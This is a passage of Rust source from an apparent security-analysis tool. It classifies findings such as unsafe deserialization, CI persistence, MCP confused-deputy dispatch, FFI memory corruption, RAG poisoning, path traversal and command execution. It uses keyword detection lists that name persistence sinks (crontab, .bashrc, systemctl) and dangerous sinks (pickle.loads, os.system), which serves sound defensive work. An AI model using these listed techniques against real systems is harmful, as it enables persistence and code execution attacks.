        || path_lower.contains("/sample")
        || path_lower.contains("/samples/")
        || path_lower.contains("/local/")
        || path_lower.contains("/devcontainer/")
        || path_lower.ends_with(".md");
    if in_nonproduction_path {
        return ProofClass::InvariantViolationProof;
    }

    let source_lower = source.to_ascii_lowercase();
    let has_persistence_sink = source_lower.contains("systemctl enable")
        || source_lower.contains("systemctl start")
        || source_lower.contains("/etc/systemd/system")
        || source_lower.contains("init.d/")
        || source_lower.contains("rc.local")
        || source_lower.contains("crontab -")
        || source_lower.contains("cron.d")
        || source_lower.contains(".bashrc")
        || source_lower.contains("/etc/environment")
        || source_lower.contains("launchctl")
        || source_lower.contains("launchagents")
        || source_lower.contains(".github/workflows/");
    let has_ci_or_package_lifecycle = path_lower.contains(".github/workflows/")
        || path_lower.contains("postinst")
        || path_lower.contains("postinstall")
        || path_lower.contains("preinstall")
        || path_lower.contains("packaging/")
        || path_lower.contains("debian/")
        || path_lower.contains("rpm/")
        || path_lower.ends_with("package.json")
        || source_lower.contains("github_token")
        || source_lower.contains("github.event")
        || source_lower.contains("pull_request_target")
        || source_lower.contains("workflow_dispatch")
        || source_lower.contains("postinst")
        || source_lower.contains("postinstall")
        || source_lower.contains("preinstall")
        || source_lower.contains("dpkg")
        || source_lower.contains("npm_config");
    let has_attestation_or_allowlist = source_lower.contains("sha256")
        || source_lower.contains("sha384")
        || source_lower.contains("sha512")
        || source_lower.contains("checksum")
        || source_lower.contains("cosign")
        || source_lower.contains("sigstore")
        || source_lower.contains("gpg --verify")
        || source_lower.contains("in-toto")
        || source_lower.contains("allowlist")
        || source_lower.contains("allowed_services")
        || source_lower.contains("trusted_service")
        || source_lower.contains("signed artifact");
    if has_attestation_or_allowlist {
        return ProofClass::InvariantViolationProof;
    }

    if ci_persistence_vector_is_reachable(
        has_persistence_sink,
        has_ci_or_package_lifecycle,
        has_attestation_or_allowlist,
        in_nonproduction_path,
    ) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Returns `true` when production Java deserialization consumes attacker-
/// controlled bytes without an object filter, class allowlist, or fixed mapping.
pub fn java_deser_allowlist_bypass_is_reachable(
    has_deserialization_sink: bool,
    has_untrusted_source: bool,
    has_allowlist_or_filter: bool,
    in_nonproduction_path: bool,
) -> bool {
    has_deserialization_sink
        && has_untrusted_source
        && !has_allowlist_or_filter
        && !in_nonproduction_path
}

/// Classifies a `security:java_deser_allowlist_bypass` finding into a `ProofClass`.
///
/// - Tests/generated/migrations/fixtures -> `InvariantViolationProof`
/// - ObjectInputFilter, class allowlists, or fixed type mappings -> `InvariantViolationProof`
/// - Production Java request/message bytes reaching native deserialization -> `ReachabilityProof`
/// - Otherwise -> `LatticeGapProposal`
pub fn classify_java_deser_allowlist_bypass_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let path_lower = finding
        .file
        .as_deref()
        .unwrap_or_default()
        .replace('\\', "/")
        .to_ascii_lowercase();
    let in_nonproduction_path = path_lower.contains("test")
        || path_lower.contains("fixture")
        || path_lower.contains("mock")
        || path_lower.contains("spec")
        || path_lower.contains("generated")
        || path_lower.contains("migration")
        || path_lower.contains("examples/")
        || path_lower.contains("/docs/")
        || path_lower.contains("/sample")
        || path_lower.contains("/samples/")
        || path_lower.contains("/bench")
        || path_lower.contains("/script")
        || path_lower.ends_with(".md");
    if in_nonproduction_path {
        return ProofClass::InvariantViolationProof;
    }

    let source_lower = source.to_ascii_lowercase();
    let has_constant_fixture = source_lower.contains("bytearrayinputstream(new byte")
        || source_lower.contains("static final byte[]")
        || source_lower.contains("private static final byte[]")
        || source_lower.contains("serialized_fixture")
        || source_lower.contains("constant fixture");
    let has_allowlist_or_filter = source_lower.contains("objectinputfilter")
        || source_lower.contains("setobjectinputfilter")
        || source_lower.contains("serialfilter")
        || source_lower.contains("validatingobjectinputstream")
        || source_lower.contains("classfilter")
        || source_lower.contains("allowlist")
        || source_lower.contains("whitelist")
        || source_lower.contains("allowedclasses")
        || source_lower.contains("allowed_classes")
        || source_lower.contains("setdecoderclass")
        || source_lower.contains("sealed class")
        || source_lower.contains("sealed interface")
        || source_lower.contains("typeregistry")
        || source_lower.contains("type registry")
        || source_lower.contains("fixed type")
        || has_constant_fixture;
    if has_allowlist_or_filter {
        return ProofClass::InvariantViolationProof;
    }

    let has_deserialization_sink = source_lower.contains("objectinputstream")
        || source_lower.contains("readobject(")
        || source_lower.contains("resolveclass(")
        || source_lower.contains("objectserializationdecoder")
        || source_lower.contains("objectdecoderinputstream")
        || source_lower.contains("deserialize(")
        || source_lower.contains("xmldecoder")
        || source_lower.contains("xstream")
        || source_lower.contains("fromxml(");
    let has_untrusted_source = source_lower.contains("httpservletrequest")
        || source_lower.contains("servletinputstream")
        || source_lower.contains("request.getinputstream(")
        || source_lower.contains("request.getparameter(")
        || source_lower.contains("request.getheader(")
        || source_lower.contains("@requestbody")
        || source_lower.contains("multipartfile")
        || source_lower.contains("socket.getinputstream(")
        || source_lower.contains("session.getattribute(")
        || source_lower.contains("message.getbody(")
        || source_lower.contains("bytesmessage")
        || source_lower.contains("consumerrecord")
        || source_lower.contains("record.value(")
        || source_lower.contains("body.get(")
        || source_lower.contains("inputstream");

    if java_deser_allowlist_bypass_is_reachable(
        has_deserialization_sink,
        has_untrusted_source,
        has_allowlist_or_filter,
        in_nonproduction_path,
    ) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Returns `true` when an unsafe native deserializer consumes attacker-
/// controlled input without a safe loader, type allowlist, signature, or schema.
pub fn unsafe_deserialization_is_reachable(
    has_unsafe_deserialization_sink: bool,
    has_untrusted_source: bool,
    has_safe_deserialization_guard: bool,
    in_nonproduction_path: bool,
) -> bool {
    has_unsafe_deserialization_sink
        && has_untrusted_source
        && !has_safe_deserialization_guard
        && !in_nonproduction_path
}

/// Classifies a `security:unsafe_deserialization` finding into a `ProofClass`.
///
/// - Tests/benchmarks/generated/cache scripts -> `InvariantViolationProof`
/// - Safe loaders, filters, signatures, or fixed schemas -> `InvariantViolationProof`
/// - Production request/message/upload input reaching native deserialization -> `ReachabilityProof`
/// - Otherwise -> `LatticeGapProposal`
pub fn classify_unsafe_deserialization_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let path_lower = finding
        .file
        .as_deref()
        .unwrap_or_default()
        .replace('\\', "/")
        .to_ascii_lowercase();
    let in_nonproduction_path = path_lower.contains("test")
        || path_lower.contains("fixture")
        || path_lower.contains("mock")
        || path_lower.contains("spec")
        || path_lower.contains("generated")
        || path_lower.contains("benchmark")
        || path_lower.contains("/bench")
        || path_lower.contains("/cache/")
        || path_lower.contains("/script")
        || path_lower.contains("examples/")
        || path_lower.contains("/docs/")
        || path_lower.ends_with(".md");
    if in_nonproduction_path {
        return ProofClass::InvariantViolationProof;
    }

    let source_lower = source.to_ascii_lowercase();
    let has_safe_deserialization_guard = source_lower.contains("safe_load")
        || source_lower.contains("safeloader")
        || source_lower.contains("typ='safe'")
        || source_lower.contains("typ=\"safe\"")
        || source_lower.contains("objectinputfilter")
        || source_lower.contains("setobjectinputfilter")
        || source_lower.contains("validatingobjectinputstream")
        || source_lower.contains("classfilter")
        || source_lower.contains("allowlist")
        || source_lower.contains("whitelist")
        || source_lower.contains("type allowlist")
        || source_lower.contains("schema")
        || source_lower.contains("fixed schema")
        || source_lower.contains("jsonschema")
        || source_lower.contains("signature")
        || source_lower.contains("verify(")
        || source_lower.contains("verified")
        || source_lower.contains("hmac")
        || source_lower.contains("signed artifact")
        || source_lower.contains("offline-only")
        || source_lower.contains("offline_only")
        || source_lower.contains("constant fixture");
    if has_safe_deserialization_guard {
        return ProofClass::InvariantViolationProof;
    }

    let has_unsafe_deserialization_sink = source_lower.contains("pickle.loads(")
        || source_lower.contains("pickle.load(")
        || source_lower.contains("yaml.load(")
        || source_lower.contains("marshal.load(")
        || source_lower.contains("marshal.restore(")
        || source_lower.contains("objectinputstream")
        || source_lower.contains("readobject(")
        || source_lower.contains("xmldecoder")
        || source_lower.contains("xstream")
        || source_lower.contains("fromxml(")
        || source_lower.contains("unserialize(")
        || source_lower.contains("binaryformatter")
        || source_lower.contains("typenamehandling.auto")
        || source_lower.contains("typenamehandling.all")
        || source_lower.contains("typenamehandling.objects")
        || source_lower.contains("losformatter")
        || source_lower.contains("objectstateformatter")
        || source_lower.contains("deserialize(");
    let has_untrusted_source = source_lower.contains("request.")
        || source_lower.contains("request[")
        || source_lower.contains("req.")
        || source_lower.contains("req[")
        || source_lower.contains("httpservletrequest")
        || source_lower.contains("servletinputstream")
        || source_lower.contains("@requestbody")
        || source_lower.contains("headers")
        || source_lower.contains("getheader")
        || source_lower.contains("getparameter")
        || source_lower.contains("params[")
        || source_lower.contains("query[")
        || source_lower.contains("body[")
        || source_lower.contains("body.get(")
        || source_lower.contains("cookie")
        || source_lower.contains("session")
        || source_lower.contains("webhook")
        || source_lower.contains("upload")
        || source_lower.contains("multipart")
        || source_lower.contains("socket")
        || source_lower.contains("message.getbody(")
        || source_lower.contains("consumerrecord")
        || source_lower.contains("record.value(")
        || source_lower.contains("queue")
        || source_lower.contains("kafka");

    if unsafe_deserialization_is_reachable(
        has_unsafe_deserialization_sink,
        has_untrusted_source,
        has_safe_deserialization_guard,
        in_nonproduction_path,
    ) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Returns `true` when untrusted MCP session/tool input can reach privileged
/// dispatch without a session-secret, capability, or same-principal guard.
pub fn mcp_confused_deputy_dispatch_is_reachable(
    has_session_dispatch: bool,
    has_untrusted_session_or_tool_input: bool,
    has_secret_or_capability_guard: bool,
    in_nonproduction_path: bool,
) -> bool {
    has_session_dispatch
        && has_untrusted_session_or_tool_input
        && !has_secret_or_capability_guard
        && !in_nonproduction_path
}

/// Classifies a `security:mcp_confused_deputy_dispatch` finding into a
/// `ProofClass`.
///
/// - Tests/generated/local-dev transports -> `InvariantViolationProof`
/// - Session-secret, capability, or same-principal guard -> `InvariantViolationProof`
/// - Production untrusted session/tool dispatch without a guard -> `ReachabilityProof`
/// - Otherwise -> `LatticeGapProposal`
pub fn classify_mcp_confused_deputy_dispatch_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let path_lower = finding
        .file
        .as_deref()
        .unwrap_or_default()
        .replace('\\', "/")
        .to_ascii_lowercase();
    let in_nonproduction_path = path_lower.contains("test")
        || path_lower.contains("fixture")
        || path_lower.contains("mock")
        || path_lower.contains("spec")
        || path_lower.contains("generated")
        || path_lower.contains("examples/")
        || path_lower.contains("/docs/")
        || path_lower.contains("/sample")
        || path_lower.contains("/samples/")
        || path_lower.contains("/local")
        || path_lower.contains("/dev")
        || path_lower.ends_with(".md");
    if in_nonproduction_path {
        return ProofClass::InvariantViolationProof;
    }

    let source_lower = source.to_ascii_lowercase();
    let has_secret_or_capability_guard = source_lower.contains("verify_session")
        || (source_lower.contains("verify(") && source_lower.contains("secret"))
        || source_lower.contains("presented_secret")
        || source_lower.contains("session_secret")
        || source_lower.contains("session.secret")
        || source_lower.contains("hmac")
        || source_lower.contains("token_check")
        || source_lower.contains("authenticate")
        || source_lower.contains("authorize_tool")
        || source_lower.contains("allowed_tools")
        || source_lower.contains("tool_allowlist")
        || source_lower.contains("capability_binding")
        || source_lower.contains("bind_capability")
        || source_lower.contains("verify_capability")
        || source_lower.contains("required_capability")
        || source_lower.contains("capabilities.contains")
        || source_lower.contains("same_principal")
        || source_lower.contains("sameprincipal")
        || source_lower.contains("principal_id ==")
        || source_lower.contains("tenant_id ==");
    if has_secret_or_capability_guard {
        return ProofClass::InvariantViolationProof;
    }

    let has_session_dispatch = (source_lower.contains("sessions.get(")
        || source_lower.contains("session_map.get(")
        || source_lower.contains("sessionstore.get(")
        || source_lower.contains("lookup_session(")
        || source_lower.contains("session_by_id("))
        && (source_lower.contains(".invoke(")
            || source_lower.contains("invoke_tool")
            || source_lower.contains("call_tool")
            || source_lower.contains("execute_tool")
            || source_lower.contains("run_tool")
            || source_lower.contains("dispatch_tool")
            || source_lower.contains("tools/call"));
    let has_untrusted_session_or_tool_input = source_lower.contains("req.id")
        || source_lower.contains("request.id")
        || source_lower.contains("params.id")
        || source_lower.contains("session_id")
        || source_lower.contains("req.tool")
        || source_lower.contains("request.tool")
        || source_lower.contains("tool_name")
        || source_lower.contains("tool")
        || source_lower.contains("args")
        || source_lower.contains("jsonrpc")
        || source_lower.contains("tools/call");

    if mcp_confused_deputy_dispatch_is_reachable(
        has_session_dispatch,
        has_untrusted_session_or_tool_input,
        has_secret_or_capability_guard,
        in_nonproduction_path,
    ) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Returns `true` when a production FFI/export boundary lets attacker-
/// controlled pointer/length data reach unsafe memory construction or copy
/// without null, length, ownership, or bounds guards.
pub fn ffi_memory_corruption_is_reachable(
    has_ffi_export_boundary: bool,
    has_unsafe_memory_sink: bool,
    has_pointer_or_length_guard: bool,
    in_nonproduction_path: bool,
) -> bool {
    has_ffi_export_boundary
        && has_unsafe_memory_sink
        && !has_pointer_or_length_guard
        && !in_nonproduction_path
}

/// Classifies a `security:ffi_memory_corruption` finding into a `ProofClass`.
///
/// - Tests/examples/generated bindings/local shims -> `InvariantViolationProof`
/// - Null, length, ownership, or bounds guard -> `InvariantViolationProof`
/// - Production FFI/export boundary with unsafe pointer/length sink -> `ReachabilityProof`
/// - Otherwise -> `LatticeGapProposal`
pub fn classify_ffi_memory_corruption_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let path_lower = finding
        .file
        .as_deref()
        .unwrap_or_default()
        .replace('\\', "/")
        .to_ascii_lowercase();
    let in_nonproduction_path = path_lower.contains("test")
        || path_lower.contains("fixture")
        || path_lower.contains("mock")
        || path_lower.contains("spec")
        || path_lower.contains("generated")
        || path_lower.contains("examples/")
        || path_lower.contains("/docs/")
        || path_lower.contains("/sample")
        || path_lower.contains("/samples/")
        || path_lower.contains("/local")
        || path_lower.contains("/platform_shim")
        || path_lower.contains("/bindings/")
        || path_lower.ends_with("bindings.rs")
        || path_lower.ends_with(".md");
    if in_nonproduction_path {
        return ProofClass::InvariantViolationProof;
    }

    let source_lower = source.to_ascii_lowercase();
    let has_pointer_or_length_guard = source_lower.contains(".is_null()")
        || source_lower.contains("is_null(")
        || source_lower.contains("nonnull::new")
        || source_lower.contains("non-null")
        || source_lower.contains("len == 0")
        || source_lower.contains("len > 0")
        || source_lower.contains("len <=")
        || source_lower.contains("len.checked")
        || source_lower.contains("checked_len")
        || source_lower.contains("validate_len")
        || source_lower.contains("bounds")
        || source_lower.contains("checked_add")
        || source_lower.contains("checked_mul")
        || source_lower.contains("slice.len()")
        || source_lower.contains("assert!(")
        || source_lower.contains("debug_assert!(")
        || source_lower.contains("ownership_guard")
        || source_lower.contains("borrowed")
        || source_lower.contains("read_only")
        || source_lower.contains("readonly");
    if has_pointer_or_length_guard {
        return ProofClass::InvariantViolationProof;
    }

    let has_ffi_export_boundary = source_lower.contains("extern \"c\"")
        || source_lower.contains("#[no_mangle]")
        || source_lower.contains("pub unsafe extern")
        || source_lower.contains("secp256k1_api")
        || source_lower.contains("extern {");
    let has_unsafe_memory_sink = source_lower.contains("from_raw_parts")
        || source_lower.contains("from_ptr")
        || source_lower.contains("transmute")
        || source_lower.contains("copy_nonoverlapping")
        || source_lower.contains("memcpy")
        || source_lower.contains("memmove")
        || source_lower.contains("box::from_raw")
        || source_lower.contains("unsafe {")
        || source_lower.contains("as *mut");

    if ffi_memory_corruption_is_reachable(
        has_ffi_export_boundary,
        has_unsafe_memory_sink,
        has_pointer_or_length_guard,
        in_nonproduction_path,
    ) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

fn append_gap_proposals_to(path: &Path, proposals: &[String]) -> std::io::Result<()> {
    let mut content = fs::read_to_string(path).unwrap_or_default();
    let mut changed = false;

    for proposal in proposals {
        let Some(heading) = proposal
            .lines()
            .find(|line| line.starts_with("### P17-3A — Proof Obligation Cure for "))
        else {
            continue;
        };
        if content.contains(heading) {
            continue;
        }
        content.push_str(proposal);
        changed = true;
    }

    if changed {
        fs::write(path, content)?;
    }
    Ok(())
}

/// Pure boolean predicate for Kani verification of embedding trust transposition logic.
///
/// Returns `true` iff untrusted input reaches a vector-similarity retrieval sink and
/// no source-trust guard, tenant allowlist, or provenance filter is present outside
/// a test/example/notebook path.
pub fn embedding_trust_transposition_is_reachable(
    has_retrieval_sink: bool,
    has_untrusted_input: bool,
    has_trust_guard: bool,
    in_test_path: bool,
) -> bool {
    has_retrieval_sink && has_untrusted_input && !has_trust_guard && !in_test_path
}

/// Classify the proof state for a `security:embedding_trust_transposition` finding.
///
/// `ReachabilityProof` — production RAG path where untrusted user/session input
/// reaches a vector-similarity retrieval sink AND an LLM API call is present in
/// the same file, with no source-trust ranking, tenant/source allowlist,
/// policy-context separation, or provenance filter visible in the ±20-line window.
///
/// `InvariantViolationProof` — a trust-prioritization guard (`trusted_sources`,
/// `rerank_trusted`, `source_allowlist`, `provenance_filter`, `trust_rank`) is
/// visible, or the file is a test/example/notebook path.
///
/// `LatticeGapProposal` — retrieval sink present but no LLM sink found (e.g.,
/// Go utility/auth code) or input origin unclear.
pub fn classify_embedding_trust_transposition_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let in_test_path = finding
        .file
        .as_deref()
        .map(|p| {
            p.contains("test")
                || p.contains("spec")
                || p.contains("example")
                || p.contains("notebook")
                || p.ends_with("_test.py")
                || p.ends_with(".ipynb")
        })
        .unwrap_or(false);
    if in_test_path {
        return ProofClass::InvariantViolationProof;
    }

    let lower = source.to_ascii_lowercase();

    let trust_guard_tokens = [
        "trusted_sources",
        "source_allowlist",
        "rerank_trusted",
        "trust_rank",
        "provenance_filter",
        "source_filter",
        "allowed_sources",
        "source in trusted",
        "source_trust",
        "metadata['source']",
        "metadata[\"source\"]",
        "filter_by_source",
    ];
    let has_trust_guard = trust_guard_tokens.iter().any(|t| lower.contains(t));

    if has_trust_guard {
        return ProofClass::InvariantViolationProof;
    }

    let retrieval_tokens = [
        "similarity_search",
        "similaritysearch",
        "vectorstore.query",
        "as_retriever",
        "retrieval_qa",
        "retrieverqa",
        "vector_store.search",
        "query_vector",
        "retrieve(",
    ];
    let has_retrieval_sink = retrieval_tokens.iter().any(|t| lower.contains(t));

    let untrusted_tokens = [
        "request.",
        "req.",
        "user_input",
        "message.content",
        "query = ",
        "prompt = ",
        "chat_input",
        "body[",
        "params[",
        "args[",
    ];
    let has_untrusted_input = untrusted_tokens.iter().any(|t| lower.contains(t));

    // Require an LLM API call token to be present in the same file.
    // Without this gate, Go utility code (DB auth, AWS signing) with
    // vector-like patterns produces false-positive reachability proofs.
    let llm_sink_tokens = [
        "openai",
        "anthropic",
        "llm.invoke",
        "llm.predict",
        "chat.completions",
        "claude.",
        "gemini.",
        "vertex_ai",
        "bedrock",
        "langchain",
    ];
    let has_llm_sink = llm_sink_tokens.iter().any(|t| lower.contains(t));

    if embedding_trust_transposition_is_reachable(
        has_retrieval_sink && has_llm_sink,
        has_untrusted_input,
        false,
        false,
    ) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Pure boolean predicate for Kani verification of RAG context poisoning logic.
///
/// Returns `true` iff untrusted input reaches an LLM context sink via a RAG
/// retrieval path without an isolation guard, outside a test/example context.
pub fn rag_context_poisoning_is_reachable(
    has_retrieval_sink: bool,
    has_untrusted_input: bool,
    has_isolation_guard: bool,
    in_test_path: bool,
) -> bool {
    has_retrieval_sink && has_untrusted_input && !has_isolation_guard && !in_test_path
}

/// Classify the proof state for a `security:rag_context_poisoning` finding.
///
/// `ReachabilityProof` — production RAG path where untrusted session/user input
/// reaches an LLM context-injection or system-prompt concatenation sink without
/// a `context_sanitize`, `namespace_separator`, `policy_context`, `safe_context`,
/// `context_filter`, or `system_prompt_guard` visible in a ±15-line window.
///
/// `InvariantViolationProof` — a context isolation guard is visible, OR the file
/// is a test/spec/example/notebook path.
///
/// `LatticeGapProposal` — retrieval or LLM sink present but input origin unclear.
pub fn classify_rag_context_poisoning_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let in_test_path = finding
        .file
        .as_deref()
        .map(|p| {
            p.contains("test")
                || p.contains("spec")
                || p.contains("example")
                || p.contains("notebook")
                || p.ends_with("_test.py")
                || p.ends_with(".ipynb")
        })
        .unwrap_or(false);
    if in_test_path {
        return ProofClass::InvariantViolationProof;
    }

    let lower = source.to_ascii_lowercase();

    let isolation_guard_tokens = [
        "context_sanitize",
        "namespace_separator",
        "policy_context",
        "safe_context",
        "context_filter",
        "system_prompt_guard",
        "promptinjectiondetector",
        "prompt_injection_detector",
        "sanitize_context",
        "context_allowlist",
        "trusted_context",
    ];
    if isolation_guard_tokens.iter().any(|t| lower.contains(t)) {
        return ProofClass::InvariantViolationProof;
    }

    let retrieval_tokens = [
        "fetch(",
        "requests.get",
        "httpx.get",
        "similarity_search",
        "vector_store",
        "retrieval_qa",
        "retrieve(",
        "as_retriever",
        "rag_chain",
        "load_documents",
    ];
    let has_retrieval_sink = retrieval_tokens.iter().any(|t| lower.contains(t));

    let llm_sink_tokens = [
        "openai.chat",
        "llm.invoke",
        "llm.predict",
        "chat.completions.create",
        "anthropic.messages",
        "system_prompt",
        "messages=[{",
        "content=doc",
        "content=chunk",
        "content=context",
    ];
    let has_llm_sink = llm_sink_tokens.iter().any(|t| lower.contains(t));

    let untrusted_tokens = [
        "request.",
        "req.",
        "user_input",
        "query =",
        "prompt =",
        "body[",
        "params[",
        "args[",
        "fetch(url",
        "fetch(req",
    ];
    let has_untrusted_input = untrusted_tokens.iter().any(|t| lower.contains(t));

    if rag_context_poisoning_is_reachable(
        has_retrieval_sink && has_llm_sink,
        has_untrusted_input,
        false,
        false,
    ) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Pure boolean predicate for Kani verification of path traversal concatenation logic.
///
/// Returns `true` iff a user-controlled path component reaches a filesystem
/// join/open call without a canonicalization guard, outside a test path.
pub fn path_traversal_concat_is_exploitable(
    has_user_path_component: bool,
    has_canonicalization_guard: bool,
    in_test_path: bool,
) -> bool {
    has_user_path_component && !has_canonicalization_guard && !in_test_path
}

/// Classify the proof state for a `security:path_traversal_concatenation` finding.
///
/// `ReachabilityProof` — user-controlled input reaches `os.path.join` /
/// `filepath.Join` / `path.resolve` / `Paths.get` without a `realpath` /
/// `filepath.Clean` / `Path.toRealPath` / `sanitize_path` / `secure_filename`
/// guard visible in the ±10-line window.
///
/// `InvariantViolationProof` — a canonicalization guard is visible in the window,
/// OR the file path indicates a test/spec/example context.
///
/// `LatticeGapProposal` — path join present but input origin is unclear.
pub fn classify_path_traversal_concat_proof(
    source: &str,
    finding: &StructuredFinding,
) -> ProofClass {
    let in_test_path = finding
        .file
        .as_deref()
        .map(|p| {
            p.contains("test")
                || p.contains("spec")
                || p.contains("example")
                || p.ends_with("_test.py")
                || p.ends_with("_test.go")
        })
        .unwrap_or(false);
    if in_test_path {
        return ProofClass::InvariantViolationProof;
    }

    let finding_line = finding.line.unwrap_or(1) as usize;
    let lines: Vec<&str> = source.lines().collect();

    let canon_guard_tokens = [
        "realpath",
        "canonicalize",
        "secure_filename",
        "filepath.clean",
        "path.torealpat",
        "paths.normalize",
        "sanitize_path",
        "abspath",
        "os.path.abspath",
        "os.path.realpath",
    ];

    let has_canon_guard = if lines.is_empty() {
        false
    } else {
        let target = finding_line
            .saturating_sub(1)
            .min(lines.len().saturating_sub(1));
        let start = target.saturating_sub(10);
        let end = (target + 11).min(lines.len());
        let window = lines[start..end].join("\n").to_ascii_lowercase();
        canon_guard_tokens.iter().any(|t| window.contains(t))
    };

    if has_canon_guard {
        return ProofClass::InvariantViolationProof;
    }

    let lower = source.to_ascii_lowercase();
    let join_tokens = [
        "os.path.join",
        "filepath.join",
        "path.resolve",
        "paths.get",
        "path.join",
    ];
    let has_join = join_tokens.iter().any(|t| lower.contains(t));

    let untrusted_tokens = [
        "request.",
        "req.",
        "user_input",
        "filename =",
        "file_name =",
        "path =",
        "args[",
        "params[",
        "body[",
        "form[",
    ];
    let has_untrusted = untrusted_tokens.iter().any(|t| lower.contains(t));

    if path_traversal_concat_is_exploitable(has_join && has_untrusted, false, false) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Pure boolean predicate for Kani verification of dynamic import exploitability.
///
/// Returns `true` iff a user-controlled module string reaches a dynamic import
/// function without an allowlist gate, outside a test context.
pub fn dynamic_import_is_exploitable(
    has_user_controlled_module: bool,
    has_import_allowlist: bool,
    in_test_path: bool,
) -> bool {
    has_user_controlled_module && !has_import_allowlist && !in_test_path
}

/// Classify the proof state for a `security:dynamic_import` finding.
///
/// `ReachabilityProof` — user/session-controlled string reaches `importlib.import_module`,
/// `__import__`, `require(variable)`, or `import()` without an allowlist check in ±10 lines.
///
/// `InvariantViolationProof` — `ALLOWED_MODULES`, `module_allowlist`,
/// `importlib.util.find_spec` with comparison, or `PERMITTED_PLUGINS` visible, or test/spec path.
///
/// `LatticeGapProposal` — dynamic import present but input origin unclear.
pub fn classify_dynamic_import_proof(source: &str, finding: &StructuredFinding) -> ProofClass {
    let in_test_path = finding
        .file
        .as_deref()
        .map(|p| {
            p.contains("test")
                || p.contains("spec")
                || p.contains("example")
                || p.ends_with("_test.py")
                || p.ends_with("_test.js")
                || p.ends_with(".spec.ts")
        })
        .unwrap_or(false);
    if in_test_path {
        return ProofClass::InvariantViolationProof;
    }

    let lower = source.to_ascii_lowercase();

    let allowlist_tokens = [
        "allowed_modules",
        "module_allowlist",
        "permitted_plugins",
        "find_spec",
        "allowedplugins",
        "allowed_plugins",
    ];
    let has_import_allowlist = allowlist_tokens.iter().any(|t| lower.contains(t));
    if has_import_allowlist {
        return ProofClass::InvariantViolationProof;
    }

    let import_sink_tokens = [
        "importlib.import_module",
        "__import__(",
        "require(variable",
        "require(module",
        "require(plugin",
        "import(",
        "dynamicimport",
    ];
    let has_import_sink = import_sink_tokens.iter().any(|t| lower.contains(t));

    let user_input_tokens = [
        "request.",
        "req.",
        "user_input",
        "params[",
        "args[",
        "query[",
        "body[",
        "getparam",
        "getattribute",
    ];
    let has_user_controlled_module = user_input_tokens.iter().any(|t| lower.contains(t));

    if dynamic_import_is_exploitable(has_import_sink && has_user_controlled_module, false, false) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Pure boolean predicate for Kani verification of dangerous execution exploitability.
///
/// Returns `true` iff user-controlled input reaches an exec/eval/shell sink
/// without a sanitizer guard, outside a test context.
pub fn dangerous_execution_is_reachable(
    has_user_input: bool,
    has_exec_sink: bool,
    has_sanitizer: bool,
    in_test_path: bool,
) -> bool {
    has_user_input && has_exec_sink && !has_sanitizer && !in_test_path
}

/// Classify the proof state for a `security:dangerous_execution` finding.
///
/// `ReachabilityProof` — user/external input reaches `exec()`, `eval()`, `system()`,
/// `popen()`, or `subprocess.run(shell=True)` without a `shlex.quote`, `shellescape`,
/// or `validate_command` guard in ±10 lines.
///
/// `InvariantViolationProof` — a sanitizer guard is visible, or file is in
/// `script/`/`bin/`/`tools/` with only hardcoded args, or test path.
///
/// `LatticeGapProposal` — exec sink found but input origin unclear.
pub fn classify_dangerous_execution_proof(source: &str, finding: &StructuredFinding) -> ProofClass {
    let in_test_path = finding
        .file
        .as_deref()
        .map(|p| {
            p.contains("test")
                || p.contains("spec")
                || p.contains("example")
                || p.ends_with("_test.py")
                || p.ends_with("_test.sh")
        })
        .unwrap_or(false);
    if in_test_path {
        return ProofClass::InvariantViolationProof;
    }

    let lower = source.to_ascii_lowercase();

    let sanitizer_tokens = [
        "shlex.quote",
        "pipes.quote",
        "shellescape",
        "validate_command",
        "escape_shell",
        "sanitize_input",
        "shlex.split",
    ];
    let has_sanitizer = sanitizer_tokens.iter().any(|t| lower.contains(t));
    if has_sanitizer {
        return ProofClass::InvariantViolationProof;
    }

    // Script directories with hardcoded-only patterns are low risk
    let is_hardcoded_script = finding
        .file
        .as_deref()
        .map(|p| {
            (p.contains("/script/") || p.contains("/bin/") || p.contains("/tools/"))
                && !lower.contains("request.")
                && !lower.contains("user_input")
                && !lower.contains("args[")
        })
        .unwrap_or(false);
    if is_hardcoded_script {
        return ProofClass::InvariantViolationProof;
    }

    let exec_sink_tokens = [
        "exec(",
        "eval(",
        "system(",
        "popen(",
        "shell=true",
        "subprocess.run",
        "subprocess.call",
        "os.system(",
        "child_process.exec",
    ];
    let has_exec_sink = exec_sink_tokens.iter().any(|t| lower.contains(t));

    let user_input_tokens = [
        "request.",
        "req.",
        "user_input",
        "params[",
        "args[",
        "query[",
        "body[",
        "stdin",
        "sys.argv",
    ];
    let has_user_input = user_input_tokens.iter().any(|t| lower.contains(t));

    if dangerous_execution_is_reachable(has_user_input, has_exec_sink, false, false) {
        ProofClass::ReachabilityProof
    } else {
        ProofClass::LatticeGapProposal
    }
}

/// Pure boolean predicate for Kani verification of C/C++ bounded overflow exploitability.
///
/// Returns `true` when a user-controlled bound reaches an allocation or loop
/// without a visible overflow check, outside of a test file.
pub fn bounded_overflow_is_exploitable(
    has_user_controlled_bound: bool,
    has_overflow_check: bool,
    in_test_path: bool,
) -> bool {
    has_user_controlled_bound && !has_overflow_check && !in_test_path
}

/// Classify proof class for `security:bounded_overflow_witness` findings.
///
/// - `InvariantViolationProof`: test path OR overflow check visible in ±10-line window
/// - `ReachabilityProof`: user-controlled bound reaches allocation/loop without check
/// - `LatticeGapProposal`: otherwise (bound origin unclear)
